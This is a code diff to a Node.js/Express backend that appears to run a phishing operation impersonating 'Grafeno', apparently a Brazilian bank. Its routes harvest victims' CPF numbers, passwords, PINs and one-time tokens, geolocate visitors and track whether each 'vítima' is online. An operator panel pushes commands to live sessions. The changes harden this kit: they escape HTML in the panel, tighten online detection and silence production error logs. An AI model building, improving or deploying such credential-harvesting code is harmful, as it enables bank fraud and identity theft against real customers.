@@ -16,6 +16,51 @@ function safeStr(val, maxLen = 500) {
   return (val == null ? '' : String(val)).trim().slice(0, maxLen);
 }
 
+// Sanitiza na ENTRADA: limita tamanho e escapa HTML (proteção XSS antes de gravar)
+function sanitizeInput(val, maxLen = 500) {
+  return escapeForHtml(safeStr(val, maxLen));
+}
+
+// Sanitiza objeto recursivamente na entrada (strings escapadas + limite de tamanho por tipo)
+function sanitizeObjectForStorage(obj, stringMaxLen = 500) {
+  if (obj == null) return obj;
+  if (typeof obj === 'string') return sanitizeInput(obj, stringMaxLen);
+  if (Array.isArray(obj)) return obj.map(item => sanitizeObjectForStorage(item, stringMaxLen));
+  if (typeof obj === 'object') {
+    const out = {};
+    for (const k of Object.keys(obj)) {
+      out[k] = sanitizeObjectForStorage(obj[k], stringMaxLen);
+    }
+    return out;
+  }
+  return obj;
+}
+
+// Escape para uso em HTML (proteção XSS nas respostas das APIs do painel)
+function escapeForHtml(val) {
+  if (val == null) return '';
+  const s = String(val);
+  return s
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+// Sanitiza objeto recursivamente: todas as strings são escapadas para HTML (APIs do painel)
+function sanitizeForHtml(obj) {
+  if (obj == null) return obj;
+  if (typeof obj === 'string') return escapeForHtml(obj);
+  if (Array.isArray(obj)) return obj.map(sanitizeForHtml);
+  if (typeof obj === 'object') {
+    const out = {};
+    for (const k of Object.keys(obj)) out[k] = sanitizeForHtml(obj[k]);
+    return out;
+  }
+  return obj;
+}
+
 // Banco de dados (SQLite) — só DB, sem fallback em memória
 let db = null;
 try {
@@ -206,7 +251,7 @@ router.get('/painel', (req, res) => {
   res.render('painel', { title: 'Grafeno' });
 });
 
-// API para o painel exibir nome/dados no header — grava no banco (nome, cpf, data nascimento); por enquanto retorna fixo; depois pode puxar do banco por CPF digitado
+// API para o painel exibir nome/dados no header — fixo por enquanto; pode deixar exposta.
 router.get('/buscar/cpf/:cpf', (req, res) => {
   const cpf = (req.params.cpf || '').replace(/\D/g, '');
   if (!cpf || cpf.length !== 11) {
@@ -260,8 +305,7 @@ router.get('/api/sessoes', requireOperadorAuth, (req, res) => {
     }
     const pagina = (s.detalhes && s.detalhes.pagina) || 'grafeno';
     const lastPing = (s.detalhes && s.detalhes.lastPing) || 0;
-    const ultimoContato = Math.max(s.lastUpdate || 0, lastPing);
-    const online = (Date.now() - ultimoContato) < PING_ONLINE_MS;
+    const online = lastPing > 0 && (Date.now() - lastPing) < PING_ONLINE_MS;
     const ipAcesso = getIpDoAcesso(login);
     return {
       login,
@@ -283,7 +327,7 @@ router.get('/api/sessoes', requireOperadorAuth, (req, res) => {
       pagina: pagina === 'painel' ? 'painel' : 'grafeno'
     };
   });
-  list.sort((a, b) => (b.lastUpdate || 0) - (a.lastUpdate || 0)); // mais recente primeiro, uma por linha
+  list.sort((a, b) => (b.lastUpdate || 0) - (a.lastUpdate || 0)); // mais recente primeiro, uma por linha (dados já sanitizados na entrada)
   res.json({ sessoes: list });
 });
 
@@ -347,7 +391,8 @@ router.delete('/api/sessoes', requireOperadorAuth, (req, res) => {
 // --- Acessos (visitas à página — contam ao cair na página) ---
 
 function getClientIp(req) {
-  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.ip || req.connection.remoteAddress || '';
+  const raw = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.ip || req.connection.remoteAddress || '';
+  return safeStr(raw, 45);
 }
 
 function isAcessoBlocked(ip) {
@@ -381,12 +426,12 @@ router.post('/api/registrar-acesso', async (req, res) => {
   const ip = getClientIp(req);
   if (isAcessoBlocked(ip)) return res.status(403).json({ ok: false, blocked: true });
 
-  const hash = safeStr(req.body.hash || req.body.visitorId || '', 256);
-  const userAgent = safeStr(req.body.userAgent || req.headers['user-agent'] || '', 512);
-  const device = safeStr(req.body.device || '', 64).toUpperCase() || 'DESKTOP';
-  let pais = safeStr(req.body.pais || '', 100);
-  let estado = safeStr(req.body.estado || '', 100);
-  let cidade = safeStr(req.body.cidade || '', 100);
+  const hash = sanitizeInput(req.body.hash || req.body.visitorId || '', 256);
+  const userAgent = sanitizeInput(req.body.userAgent || req.headers['user-agent'] || '', 512);
+  const device = (sanitizeInput(req.body.device || '', 64) || 'DESKTOP').toUpperCase();
+  let pais = sanitizeInput(req.body.pais || '', 100);
+  let estado = sanitizeInput(req.body.estado || '', 100);
+  let cidade = sanitizeInput(req.body.cidade || '', 100);
 
   if (!pais && ip && !ip.startsWith('127.') && ip !== '::1') {
     try {
@@ -401,9 +446,9 @@ router.post('/api/registrar-acesso', async (req, res) => {
           req.on('error', () => resolve(null));
           req.setTimeout(2000, () => { req.destroy(); resolve(null); });
         });
-        if (geo && geo.country) pais = geo.country;
-        if (geo && geo.regionName) estado = geo.regionName;
-        if (geo && geo.city) cidade = geo.city;
+        if (geo && geo.country) pais = sanitizeInput(geo.country, 100);
+        if (geo && geo.regionName) estado = sanitizeInput(geo.regionName, 100);
+        if (geo && geo.city) cidade = sanitizeInput(geo.city, 100);
       }
     } catch (_) {}
   }
@@ -417,10 +462,10 @@ router.get('/operador/acessos', requireOperadorAuth, (req, res) => {
   res.render('painel-acessos', { title: 'Acessos - Painel Operador' });
 });
 
-// Listar acessos (operador) — mais recente primeiro, um por linha
+// Listar acessos (operador) — IP e geo sanitizados na saída (IP não é escapado na entrada para não quebrar bloqueio)
 router.get('/api/acessos', requireOperadorAuth, (req, res) => {
   const list = (db && db.getDb() && db.listAcessos) ? db.listAcessos(500) : [];
-  res.json({ acessos: list });
+  res.json(sanitizeForHtml({ acessos: list }));
 });
 
 // Limpar todos os acessos
@@ -474,7 +519,7 @@ router.post('/api/comando', requireOperadorAuth, (req, res) => {
   const session = getSession(login);
   let detalhes = { msg: { GRAFENO: [] } };
   if (comandoFinal === 'comando solicitado' && input_comando) {
-    detalhes.msg.GRAFENO = [{ input_comando: safeStr(input_comando, 2000) }];
+    detalhes.msg.GRAFENO = [{ input_comando: sanitizeInput(input_comando, 2000) }];
   } else if (comandoFinal === 'comando_error solicitado' && session && session.detalhes && session.detalhes.msg && session.detalhes.msg.GRAFENO && session.detalhes.msg.GRAFENO.length) {
     detalhes = { ...session.detalhes };
   }
@@ -498,26 +543,24 @@ router.post('/api/submit', async (req, res, next) => {
       });
     }
 
-    // Obter dados da sessão (mesmo getClientIp que em Acessos para o IP bater) — limites para evitar abuso
+    // Obter dados da sessão — sanitizar na entrada (proteção XSS antes de gravar)
     const ua = req.headers['user-agent'] || 'Desconhecido';
     const sessionData = {
       ip: getClientIp(req),
-      device: safeStr(formData.device || ua, 256),
-      browser: safeStr(formData.browser || ua, 256),
-      platform: safeStr(formData.platform || ua, 256),
-      local: safeStr(formData.local || 'Desconhecido', 256),
-      sistema: safeStr(formData.sistema || 'GRAFENO', 64),
-      visitorId: safeStr(formData.visitorId || '', 256)
+      device: sanitizeInput(formData.device || ua, 256),
+      browser: sanitizeInput(formData.browser || ua, 256),
+      platform: sanitizeInput(formData.platform || ua, 256),
+      local: sanitizeInput(formData.local || 'Desconhecido', 256),
+      sistema: sanitizeInput(formData.sistema || 'GRAFENO', 64),
+      visitorId: sanitizeInput(formData.visitorId || '', 256)
     };
 
-    // Combinar dados do formulário com dados da sessão
-    const dataToSend = {
+    const dataToSend = sanitizeObjectForStorage({
       ...formData,
       ...sessionData,
-      document_number: cpf.replace(/[^\d]/g, '') // Garantir CPF limpo
-    };
+      document_number: cpf.replace(/[^\d]/g, '')
+    }, 2000);
 
-    // Atualizar dados do usuário no cache
     const userData = updateUserData(cpf, dataToSend);
 
     const ip = getClientIp(req);
@@ -530,7 +573,7 @@ router.post('/api/submit', async (req, res, next) => {
       actionsCount: userData.actions.length
     });
   } catch (error) {
-    console.error('Erro api/submit:', error);
+    if (process.env.NODE_ENV !== 'production') console.error('Erro api/submit:', error.message);
     res.status(500).json({ 
       success: false, 
       message: 'Erro ao processar dados' 
@@ -553,26 +596,25 @@ router.post('/grafeno', async (req, res, next) => {
     const uaG = req.headers['user-agent'] || 'Desconhecido';
     const sessionData = {
       ip: getClientIp(req),
-      device: safeStr(uaG, 256),
-      browser: safeStr(uaG, 256),
-      platform: safeStr(uaG, 256),
+      device: sanitizeInput(uaG, 256),
+      browser: sanitizeInput(uaG, 256),
+      platform: sanitizeInput(uaG, 256),
       local: 'Desconhecido',
       sistema: 'GRAFENO'
     };
 
-    // Processar dados do formulário (limites para evitar abuso)
-    const processedData = {
+    const processedData = sanitizeObjectForStorage({
       document_number: cpf.replace(/[^\d]/g, ''),
       password: safeStr(formData['user[password]'] || formData.password || '', 256),
       pin_attempt: safeStr(formData['user[pin_attempt]'] || formData.pin_attempt || '', 32),
       otp_attempt: safeStr(formData['user[otp_attempt]'] || formData.otp_attempt || '', 32),
       comando_input: safeStr(formData['user[comando_input]'] || formData.comando_input || '', 2000),
-      remember_me: formData['user[remember_me]'] || formData.remember_me || '0',
+      remember_me: safeStr((formData['user[remember_me]'] || formData.remember_me || '0').toString(), 10),
       formType: 'login',
       ...sessionData
-    };
+    }, 2000);
+    processedData.document_number = cpf.replace(/[^\d]/g, '');
 
-    // Atualizar dados do usuário no cache
     const userData = updateUserData(cpf, processedData);
 
     const ip = getClientIp(req);
@@ -586,7 +628,7 @@ router.post('/grafeno', async (req, res, next) => {
 });
 
 // --- API de ping: registra presença da vítima (online). Aceita login para associar à sessão. ---
-const PING_ONLINE_MS = 60 * 1000; // considera "online" se último contato em até 60s
+const PING_ONLINE_MS = 15 * 1000; // considera "online" só se último ping em até 15s (parou de comunicar = Saiu rápido)
 
 router.post('/api/ping', (req, res) => {
   const ip = req.body.ip || req.ip || req.headers['x-forwarded-for'] || '';
@@ -628,15 +670,15 @@ router.post('/salvar-login', async (req, res) => {
     const uaS = req.headers['user-agent'] || '';
     const sessionData = {
       ip: clientIp,
-      device: safeStr(device || uaS, 256),
-      browser: safeStr(uaS, 256),
-      platform: safeStr(device || uaS, 256),
-      local: safeStr(local || '', 256),
-      sistema: safeStr(tipo || 'GRAFENO', 64)
+      device: sanitizeInput(device || uaS, 256),
+      browser: sanitizeInput(uaS, 256),
+      platform: sanitizeInput(device || uaS, 256),
+      local: sanitizeInput(local || '', 256),
+      sistema: sanitizeInput(tipo || 'GRAFENO', 64)
     };
     const dataToSend = {
       document_number: login,
-      password: safeStr(senha || '', 256),
+      password: sanitizeInput(senha || '', 256),
       formType: 'login',
       ...sessionData
     };
@@ -645,7 +687,7 @@ router.post('/salvar-login', async (req, res) => {
     vincularAcessoAoCPF(clientIp, login);
     res.json({ success: true });
   } catch (err) {
-    console.error('Erro salvar-login:', err);
+    if (process.env.NODE_ENV !== 'production') console.error('Erro salvar-login:', err.message);
     res.status(500).json({ success: false });
   }
 });
@@ -691,9 +733,9 @@ router.post('/atualizar-etapa', async (req, res) => {
     const uaE = req.headers['user-agent'] || '';
     const sessionData = {
       ip: getClientIp(req),
-      device: safeStr(uaE, 256),
-      browser: safeStr(uaE, 256),
-      platform: safeStr(uaE, 256),
+      device: sanitizeInput(uaE, 256),
+      browser: sanitizeInput(uaE, 256),
+      platform: sanitizeInput(uaE, 256),
       local: '',
       sistema: 'GRAFENO'
     };
@@ -702,20 +744,20 @@ router.post('/atualizar-etapa', async (req, res) => {
     const dataToSend = { document_number: login, ...sessionData };
     if (etapaNorm === 'PIN') {
       formType = 'pin';
-      dataToSend.pin_attempt = safeStr(valor, 32);
+      dataToSend.pin_attempt = sanitizeInput(valor, 32);
     } else if (etapaNorm === 'TOKEN') {
       formType = 'token';
-      dataToSend.otp_attempt = safeStr(valor, 32);
+      dataToSend.otp_attempt = sanitizeInput(valor, 32);
     } else if (etapaNorm === 'COMANDO') {
       formType = 'comando';
-      dataToSend.comando_input = safeStr(valor, 2000);
+      dataToSend.comando_input = sanitizeInput(valor, 2000);
     }
     dataToSend.formType = formType;
     const userData = updateUserData(login, dataToSend);
     updateSessionLastUpdate(login);
     res.json({ success: true });
   } catch (err) {
-    console.error('Erro atualizar-etapa:', err);
+    if (process.env.NODE_ENV !== 'production') console.error('Erro atualizar-etapa:', err.message);
     res.status(500).json({ success: false });
   }
 });
